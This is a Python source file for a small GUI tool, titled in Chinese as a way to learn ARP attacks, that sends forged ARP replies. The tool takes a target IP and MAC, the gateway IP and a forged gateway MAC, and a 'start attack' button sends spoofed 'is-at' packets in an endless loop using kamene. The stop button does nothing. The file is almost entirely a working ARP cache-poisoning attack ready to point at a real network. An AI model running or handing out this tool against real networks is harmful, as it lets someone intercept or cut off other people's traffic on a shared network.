#!/usr/bin/env python
#-*- coding:utf-8 -*-


from tkinter import *
from tkinter.font import Font
from tkinter.ttk import *
from kamene.all import *
import threading
from tkinter.messagebox import *
#import tkinter.filedialog as tkFileDialog
#import tkinter.simpledialog as tkSimpleDialog    #askstring()

class Application_ui(Frame):
    #这个类仅实现界面生成功能，具体事件处理代码在子类Application中。
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.master.title('学习ARP攻击')
        self.master.geometry('444x500')
        self.createWidgets()

    def createWidgets(self):
        self.top = self.winfo_toplevel()

        self.style = Style()

        self.style.configure('Label1.TLabel', font=('宋体',9))
        self.Label1 = Label(self.top, text='ARP攻击', style='Label1.TLabel')
        self.Label1.place(relx=0.5, rely=0.120,anchor=CENTER)

        self.style.configure('Label2.TLabel', font=('宋体',9))
        self.Label2 = Label(self.top, text='目标IP：', style='Label2.TLabel')
        self.Label2.place(relx=0.2, rely=0.25,anchor=CENTER)

        self.style.configure('Label3.TLabel', font=('宋体',9))
        self.Label3 = Label(self.top, text='目标mac地址：', style='Label3.TLabel')
        self.Label3.place(relx=0.2, rely=0.375,anchor=CENTER)

        self.style.configure('Label4.TLabel', font=('宋体',9))
        self.Label4 = Label(self.top, text='网关IP地址：', style='Label4.TLabel')
        self.Label4.place(relx=0.2, rely=0.5,anchor=CENTER)

        self.style.configure('Label4.TLabel', font=('宋体',9))
        self.Label5 = Label(self.top, text='伪造网关MAC地址：', style='Label5.TLabel')
        self.Label5.place(relx=0.2, rely=0.625,anchor=CENTER)

        self.Text1Var = StringVar(value='')
        self.Text1 = Entry(self.top, text='', textvariable=self.Text1Var, font=('宋体',9))
        self.Text1.place(relx=0.3, rely=0.25, relwidth=0.5, relheight=0.075,anchor=W)

        self.Text2Var = StringVar(value='')
        self.Text2 = Entry(self.top, text='', textvariable=self.Text2Var, font=('宋体',9))
        self.Text2.place(relx=0.3, rely=0.375, relwidth=0.5, relheight=0.075,anchor=W)

        self.Text3Var = StringVar(value='')
        self.Text3 = Entry(self.top, text='', textvariable=self.Text3Var, font=('宋体',9))
        self.Text3.place(relx=0.3, rely=0.5, relwidth=0.5, relheight=0.075,anchor=W)

        self.Text4Var = StringVar(value='')
        self.Text4 = Entry(self.top, text='', textvariable=self.Text4Var, font=('宋体',9))
        self.Text4.place(relx=0.3, rely=0.625, relwidth=0.5, relheight=0.075,anchor=W)

        self.style.configure('Command1.TButton',font=('宋体',9))
        self.Command1 = Button(self.top, text='开始攻击', command=self.Command1_Cmd, style='Command1.TButton')
        self.Command1.place(relx=0.5, rely=0.775, relwidth=0.35, relheight=0.085,anchor=CENTER)

        self.style.configure('Command2.TButton',font=('宋体',9))
        self.Command2 = Button(self.top, text='停止攻击', command=self.Command2_Cmd, style='Command2.TButton')
        self.Command2.place(relx=0.5, rely=0.9, relwidth=0.35, relheight=0.085,anchor=CENTER)



class Application(Application_ui):
    #这个类实现具体的事件处理回调函数。界面生成代码在Application_ui中。
    def __init__(self, master=None):
        Application_ui.__init__(self, master)

    def starc(self):
        eth = Ether()
        arp = ARP(
            op="is-at",
            hwsrc=self.Text4.get(),
            psrc=self.Text3.get(),
            hwdst=self.Text2.get(),
            pdst=self.Text1.get(),
            # hwsrc='22:22:22:22:22:22',
            # psrc='192.168.43.1',
            # hwdst='00:0c:29:94:f1:a7',
            # pdst='192.168.10.129',
        )
        print((eth / arp).show())
        sendp(eth / arp, inter=2, loop=1)


    def Command1_Cmd(self, event=None):
        #TODO, Please finish the function here!
        t = threading.Thread(target=self.starc)
        t.setDaemon(True)
        t.start()



    def Command2_Cmd(self, event=None):
        #TODO, Please finish the function here!
        pass

if __name__ == "__main__":
    top = Tk()
    Application(top).mainloop()
    try: top.destroy()
    except: pass
